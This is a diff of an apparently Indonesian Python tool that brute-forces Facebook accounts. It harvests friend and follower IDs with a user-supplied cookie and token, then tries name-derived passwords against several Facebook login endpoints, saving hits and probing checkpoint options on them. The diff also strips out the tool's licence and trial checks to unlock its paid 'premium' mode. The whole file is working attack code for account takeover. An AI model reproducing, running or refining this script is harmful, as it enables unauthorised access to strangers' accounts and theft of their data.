@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 # cython: language_level=3str
 # cython: auto_pickle=False
 import os, sys, re, time, requests, calendar, random, bs4, uuid, subprocess
@@ -40,55 +41,55 @@ class Logo:
 
 class GetData:
 	def __init__(self):
-		try:
-			key = open(".license.log","r").read()
-			status = a["member"];
-			open(".status.log", "w").write(status)
-			expday, expmonth, expyear = exp.split(" ");
-			expmonth = bulan_x[expmonth]
-		except KeyError:
-			exp = ""
-			expday = "null";expmonth = "";expyear = ""
-			status = "Trial";open(".status.log", "w").write(status)
-		except ValueError:
-			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
-		try:
-			status = "Trial";open(".status.log", "w").write(status)
-		except ValueError:
-			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
-		try:
-			rkey = key.split("-")
-			key = ("%sxxx-%s***-%sxx***-%sxx"%(rkey[0][:4], rkey[1][:2], rkey[2][:1], rkey[3][:5]))
-		except ValueError:
-			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
-		try:
-			rkey = key.split("-")
-			key = ("%sxxx-%s***-%sxx***-%sxx"%(rkey[0][:4], rkey[1][:2], rkey[2][:1], rkey[3][:5]))
-		except ValueError:
-			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
-		except IndexError:
-			os.system("rm .license.log")
-			exit("\n [!] tidak terdeteksi api key, silakan jalankan ulang script ini")
+#		try:
+#			key = open(".license.log","r").read()
+#			status = a["member"];
+#			open(".status.log", "w").write(status)
+#			expday, expmonth, expyear = exp.split(" ");
+#			expmonth = bulan_x[expmonth]
+#		except KeyError:
+#			exp = ""
+#			expday = "null";expmonth = "";expyear = ""
+#			status = "Trial";open(".status.log", "w").write(status)
+#		except ValueError:
+#			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
+#		try:
+#			status = "Trial";open(".status.log", "w").write(status)
+#		except ValueError:
+#			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
+#		try:
+#			rkey = key.split("-")
+#			key = ("%sxxx-%s***-%sxx***-%sxx"%(rkey[0][:4], rkey[1][:2], rkey[2][:1], rkey[3][:5]))
+#		except ValueError:
+#			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
+#		try:
+#			rkey = key.split("-")
+#			key = ("%sxxx-%s***-%sxx***-%sxx"%(rkey[0][:4], rkey[1][:2], rkey[2][:1], rkey[3][:5]))
+#		except ValueError:
+#			exit(" [!] terjadi kesalahan tidak dapat terhubung ke server ASTA.")
+#		except IndexError:
+#			os.system("rm .license.log")
+#			exit("\n [!] tidak terdeteksi api key, silakan jalankan ulang script ini")
 		ip = requests.get("http://ip-api.com/json/").json()["query"]
-		print("  > License   : %s"%(key))
-		print("  > Expired   : %s %s %s"%(expday, expmonth, expyear))
+		print("  > License   : -") #%s"%(key))
+		print("  > Expired   : -") #%s %s %s"%(expday, expmonth, expyear))
 		print("  > Your IP   : %s"%(ip))
 
 class Main:
 	def __init__(self):
 		try:os.mkdir("OK");os.mkdir("CP")
 		except:pass
-		try:
-			key = open(".license.log","r").read()
-			CekVersi()
-		except (KeyError, IOError):
-			serial1 = uuid.uuid4().hex[:7]
-			serial2 = uuid.uuid4().hex[:6]
-			serial3 = uuid.uuid4().hex[:5]
-			serial4 = uuid.uuid4().hex[:8]
-			serial = ("%s-%s-%s-%s"%(serial1, serial2, serial3, serial4))
-			open(".license.log","w").write(serial)
-			CekVersi()
+#		try:
+#			key = open(".license.log","r").read()
+#			CekVersi()
+#		except (KeyError, IOError):
+#			serial1 = uuid.uuid4().hex[:7]
+#			serial2 = uuid.uuid4().hex[:6]
+#			serial3 = uuid.uuid4().hex[:5]
+#			serial4 = uuid.uuid4().hex[:8]
+#			serial = ("%s-%s-%s-%s"%(serial1, serial2, serial3, serial4))
+#			open(".license.log","w").write(serial)
+		CekVersi()
 
 class CekVersi:
 	def __init__(self):
@@ -130,7 +131,8 @@ class Cookies:
 		if cok in ["", " "]:
 			exit("\n [!] isi yang benar jangan kosong bro")
 		try:
-			data = requests.get("https://business.facebook.com/creatorstudio/home", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "cookie":cok})
+			data = requests.get("https://business.facebook.com/creatorstudio/home", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}, cookies={"cookie":cok})
+			open('dat.html','w').write(data.text)
 			find_token = re.search('{"accessToken":"(EAA\w+)',data.text)
 			open("token.txt", "w").write(find_token.group(1))
 			open("cookie.txt", "w").write(cok)
@@ -147,7 +149,7 @@ class Menu:
 		try:
 			token = open("token.txt","r").read()
 			cok = open("cookie.txt","r").read()
-			key = open(".license.log","r").read()
+#			key = open(".license.log","r").read()
 			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"]
 		except (KeyError, IOError):
 			os.system("rm -f token.txt cookie.txt")
@@ -166,44 +168,45 @@ class Menu:
 		print(" [7] lihat jumlah teman")
 		print(" [8] lihat hasil crack")
 		print(" [9] beli masa aktif")
-		print("\n  > ketik '\033[0;92mchange\033[0;97m' untuk ganti license")
+#		print("\n  > ketik '\033[0;92mchange\033[0;97m' untuk ganti license")
 		print("  > ketik '\033[0;91mout\033[0;97m' untuk logout (hapus cookie)")
 		ask = input("\n [?] choose : ")
-		st = open(".status.log", "r").read()
-		if "Trial" in st:
+#		st = open(".status.log", "r").read()
+#		if "Trial" in st:
+#			if ask in ["1", "01"]:
+#				print(" [!] \033[0;91mTRIAL\033[0;97m user hanya dapat 1000 id.\n")
+#				DumpPublic(token, key)
+#				Crack()
+#			elif ask in ["2", "02"]:
+#				print(" [!] \033[0;91mTRIAL\033[0;97m user hanya dapat 1000 id.\n")
+#				DumpPengikut(token, key)
+#				Crack()
+#			elif ask in ["7", "07"]:
+#				CekJumlahTeman(token)
+#			elif ask in ["8", "08"]:
+#				LihatHasil()
+#			elif ask in ["9", "09"]:
+#				BeliPrem(key)
+#			elif ask in ["change"]:
+#				key = input(" [+] masukan license : ")
+#				os.system("rm .license.log")
+#				open(".license.log","w").write(key)
+#				exit("\n [!] berhasil mengganti license")
+#			elif ask in ["out"]:
+#				os.system("rm token.txt cookie.txt")
+#				exit(" [!] berhasil logout (hapus cookie)")
+#			else:
+#				exit("\n [!] kamu perlu upgrade ke premium terlebih dahulu")
+#		else:
+		if ask != '':
 			if ask in ["1", "01"]:
-				print(" [!] \033[0;91mTRIAL\033[0;97m user hanya dapat 1000 id.\n")
-				DumpPublic(token, key)
+				DumpPublic(token) #, key)
 				Crack()
 			elif ask in ["2", "02"]:
-				print(" [!] \033[0;91mTRIAL\033[0;97m user hanya dapat 1000 id.\n")
-				DumpPengikut(token, key)
-				Crack()
-			elif ask in ["7", "07"]:
-				CekJumlahTeman(token)
-			elif ask in ["8", "08"]:
-				LihatHasil()
-			elif ask in ["9", "09"]:
-				BeliPrem(key)
-			elif ask in ["change"]:
-				key = input(" [+] masukan license : ")
-				os.system("rm .license.log")
-				open(".license.log","w").write(key)
-				exit("\n [!] berhasil mengganti license")
-			elif ask in ["out"]:
-				os.system("rm token.txt cookie.txt")
-				exit(" [!] berhasil logout (hapus cookie)")
-			else:
-				exit("\n [!] kamu perlu upgrade ke premium terlebih dahulu")
-		else:
-			if ask in ["1", "01"]:
-				DumpPublic(token, key)
-				Crack()
-			elif ask in ["2", "02"]:
-				DumpPengikut(token, key)
+				DumpPengikut(token) #, key)
 				Crack()
 			elif ask in ["3", "03"]:
-				DumpMassal(token, key)
+				DumpMassal(token) #, key)
 				Crack()
 			elif ask in ["4", "04"]:
 				DumpGroup(token, cok)
@@ -228,11 +231,11 @@ class Menu:
 				LihatHasil()
 			elif ask in ["9", "09"]:
 				BeliPrem(key)
-			elif ask in ["change"]:
-				key = input(" [+] masukan license : ")
-				os.system("rm .license.log")
-				open(".license.log","w").write(key)
-				exit("\n [!] berhasil mengganti license")
+#			elif ask in ["change"]:
+#				key = input(" [+] masukan license : ")
+#				os.system("rm .license.log")
+#				open(".license.log","w").write(key)
+#				exit("\n [!] berhasil mengganti license")
 			elif ask in ["out"]:
 				os.system("rm token.txt cookie.txt")
 				exit(" [!] berhasil logout (hapus cookie)")
@@ -246,27 +249,37 @@ class CekJumlahTeman:
 		no = 0
 		print(" [*] isi 'me' jika ingin lihat jumlah teman")
 		user = input(" [+] masukan username atau id : ")
-		if user in [""]:exit("\n [!] mohon isi yang benar jangan kosong")
-		elif user in ["me"]:idt = "me"
+		if user in [""]:
+			exit("\n [!] mohon isi yang benar jangan kosong")
+		elif user in ["me"]:
+			idt = "me"
 		elif(re.findall("\w+",user)):
 			r = requests.get("https://m.facebook.com/"+user).text
-			try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0]
-			except:exit("\n [!] akun tidak tersedia atau list teman private")
-		try:limit = int(input("\n [?] masukan limit id (cth:1000) : "))
-		except ValueError:exit("\n [!] masukan angka yang benar")
+			try:
+				idt = re.findall('\;rid\=(\d+)\&',str(r))[0]
+			except:
+				exit("\n [!] akun tidak tersedia atau list teman private")
+		try:
+			limit = int(input("\n [?] masukan limit id (cth:1000) : "))
+		except ValueError:
+			exit("\n [!] masukan angka yang benar")
 		print(" [!] tunggu sebentar sedang proses\n")
 		idi = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(idt, limit, token)).json()
-		for x in idi["data"]:tt.append(x["id"])
+		for x in idi["data"]:
+			tt.append(x["id"])
 		for id in tt:
 			try:
 				idi2 = requests.get("https://graph.facebook.com/%s/friends?limit=5000&access_token=%s"%(id, token)).json()
 				try:
-					for b in idi2["data"]:te.append(b["id"])
-				except KeyError:exit("\n [!] IP anda terkena block oleh facebook")
+					for b in idi2["data"]:
+						te.append(b["id"])
+				except KeyError:
+					exit("\n [!] IP anda terkena block oleh facebook")
 				no +=1
 				print("  > %s|%s teman"%(id, len(te)))
 				te.clear()
-			except KeyError:exit("\n [!] IP anda terkena block oleh facebook")
+			except KeyError:
+				exit("\n [!] IP anda terkena block oleh facebook")
 		input("\n [#] selesai...")
 
 class LihatHasil:
@@ -277,12 +290,15 @@ class LihatHasil:
 		if ask in ["1"]:
 			dirs = os.listdir("OK")
 			print(" [*] list nama file tersimpan di folder OK\n")
-			for file in dirs:print(" [+] "+file)
+			for file in dirs:
+				print(" [+] "+file)
 			try:
 				file = input("\n [?] pilih nama file : ")
-				if file == "":Menu()
+				if file == "":
+					Menu()
 				totalok = open("OK/%s"%(file)).read().splitlines()
-			except IOError:exit(" [!] file %s tidak tersedia"%(file))
+			except IOError:
+				exit(" [!] file %s tidak tersedia"%(file))
 			nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "")
 			print(" [#] ----------------------------------------------")
 			os.system("cat OK/%s"%(file))
@@ -347,12 +363,12 @@ class DumpGroup:
 		except:pass
 
 class DumpPublic:
-	def __init__(self, token, key):
-		st = open(".status.log", "r").read()
-		if "Premium" in st:
-			jumlah = "5000"
-		else:
-			jumlah = "1000"
+	def __init__(self, token): #, key):
+#		st = open(".status.log", "r").read()
+#		if "Premium" in st:
+		jumlah = "5000"
+#		else:
+#			jumlah = "1000"
 		print(" [*] isi 'me' jika ingin dari daftar teman")
 		user = input(" [+] masukan username atau id : ")
 		if user in [""]:
@@ -371,12 +387,12 @@ class DumpPublic:
 		print("\n [+] total id -> \033[0;91m%s\033[0;97m"%(len(id)))
 
 class DumpPengikut:
-	def __init__(self, token, key):
-		st = open(".status.log", "r").read()
-		if "Premium" in st:
-			jumlah = "5000"
-		else:
-			jumlah = "1000"
+	def __init__(self, token): #, key):
+#		st = open(".status.log", "r").read()
+#		if "Premium" in st:
+		jumlah = "5000"
+#		else:
+#			jumlah = "1000"
 		user = input(" [+] masukan username atau id : ")
 		if user in [""]:
 			exit("\n [!] isi yang benar jangan kosong bro")
@@ -394,14 +410,16 @@ class DumpPengikut:
 		print("\n [+] total id -> \033[0;91m%s\033[0;97m"%(len(id)))
 
 class DumpMassal:
-	def __init__(self, token, key):
-		st = open(".status.log", "r").read()
-		if "Premium" in st:
-			jumlah = "5000"
-		else:
-			jumlah = "1000"
-		try:tanya_total = int(input(" [+] jumlah target id : "))
-		except:tanya_total=1
+	def __init__(self, token): #, key):
+#		st = open(".status.log", "r").read()
+#		if "Premium" in st:
+		jumlah = "5000"
+#		else:
+#			jumlah = "1000"
+		try:
+			tanya_total = int(input(" [+] jumlah target id : "))
+		except:
+			tanya_total=1
 		print("\n [*] isi 'me' jika ingin dari daftar teman")
 		for t in range(tanya_total):
 			t +=1
@@ -466,18 +484,18 @@ class DumpFL:
 			print("")
 			Crack()
 
-class BeliPrem:
-	def __init__(self, key):
-		print("  > license anda : %s\n"%(key))
-		print(" [*] informasi harga : ")
-		print("  > durasi 1 minggu -> Rp 25.000 (\033[0;91mpromo\033[0;97m)")
-		print("  > durasi 1 bulan  -> Rp 50.000")
-		print("  > durasi 2 bulan  -> Rp 100.000")
-		nowa = requests.get("https://astaxd.my.id/wa.txt", headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"}).text
-		url_wa = "https://api.whatsapp.com/send?phone=%s&text="%(nowa)
-		tks = "hallo admin saya ingin beli license premium\n\n > license saya : *%s*"%(key)
-		subprocess.check_output(["am", "start", url_wa+quote(tks)])
-		exit("\n [!] anda di arahkan ke whatsapp admin")
+#class BeliPrem:
+#	def __init__(self, key):
+#		print("  > license anda : %s\n"%(key))
+#		print(" [*] informasi harga : ")
+#		print("  > durasi 1 minggu -> Rp 25.000 (\033[0;91mpromo\033[0;97m)")
+#		print("  > durasi 1 bulan  -> Rp 50.000")
+#		print("  > durasi 2 bulan  -> Rp 100.000")
+#		nowa = requests.get("https://astaxd.my.id/wa.txt", headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"}).text
+#		url_wa = "https://api.whatsapp.com/send?phone=%s&text="%(nowa)
+#		tks = "hallo admin saya ingin beli license premium\n\n > license saya : *%s*"%(key)
+#		subprocess.check_output(["am", "start", url_wa+quote(tks)])
+#		exit("\n [!] anda di arahkan ke whatsapp admin")
 
 class CekOpsi:
 	def __init__(self):
@@ -488,9 +506,10 @@ class CekOpsi:
 				kontol = memek.replace("\n","")
 				titid  = kontol.split("|")
 				print("\n [*] cek opsi akun : \033[0;93m%s\033[0;97m"%(kontol))
-				try:self.check_in(titid[0], titid[1])
-				except requests.exceptions.ConnectionError:pass
-				except requests.exceptions.ConnectionError:pass
+				try:
+					self.check_in(titid[0], titid[1])
+				except requests.exceptions.ConnectionError:
+					pass
 			exit("\n [#] cek opsi selesai...")
 		else:exit()
 
@@ -535,11 +554,6 @@ class CekOpsi:
 				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax:
 					print(" [*] \033[0;92mAkun tap yes, silakan login di fb lite\033[0;97m")
 				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):print(" [!] \033[0;91mAkun authentikasi dua faktor aktif\033[0;97m")
-
-			if(str(len(ngew)) == "0"):
-				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax:
-					print(" [*] \033[0;92mAkun tap yes, silakan login di fb lite\033[0;97m")
-				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):print(" [!] \033[0;91mAkun authentikasi dua faktor aktif\033[0;97m")
 			else:
 				print(" [*] terdapat "+str(len(ngew))+" opsi checkpoint")
 				for opt in range(len(ngew)):
@@ -551,6 +565,7 @@ class CekOpsi:
 
 class Crack:
 	def __init__(self):
+		global loop
 		ask = input(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]: ")
 		if ask in ["", " "]:
 			exit("\n [!] isi yang benar jangan kosong bro")
@@ -598,6 +613,7 @@ class Crack:
 							uid, name = user.split("<=>")
 							ss = name.split(" ")
 							listpw = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
+							loop +=1
 							coeg.submit(self.API, uid, listpw)
 						except:pass
 				print("\n\n [#] crack selesai...")
@@ -610,7 +626,9 @@ class Crack:
 							uid, name = user.split("<=>")
 							ss = name.split(" ")
 							listpw = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
+							loop +=1
 							coeg.submit(self.mbasic, uid, listpw)
+#							print(listpw)
 						except:pass
 				print("\n\n [#] crack selesai...")
 				CekOpsi()
@@ -622,6 +640,8 @@ class Crack:
 							uid, name = user.split("<=>")
 							ss = name.split(" ")
 							listpw = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
+							loop +=1
+#							print(listpw)
 							coeg.submit(self.mobile, uid, listpw)
 						except:pass
 				print("\n\n [#] crack selesai...")
@@ -666,10 +686,11 @@ class Crack:
 			loop +=1
 		except:
 			self.API(uid, listpw)
-			loop +=1
+#			loop +=1
 
 	def mbasic(self, uid, listpw):
 		global ok, cp, loop, token
+		print(loop)
 		sys.stdout.write("\r [*] crack: %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush()
 		try:
 			for pw in listpw:
@@ -741,9 +762,16 @@ class Crack:
 			loop +=1
 		except:
 			self.mobile(uid, listpw)
+	def text_crack(self):
+		print("\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal))
+		print(" [+] hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
+		print(" [!] anda bisa menjeda prosess crack dengan mematikan data seluler\n")
 
 	def text_method(self):
 		print(" \n [ pilih method crack - coba method satu ]\n")
 		print(" [1]. method API (fast)")
 		print(" [2]. method mbasic (slow)")
 		print(" [3]. method mobile (very slow \033[0;92mpro\033[0;97m)")
+
+if __name__=="__main__":
+	Main()
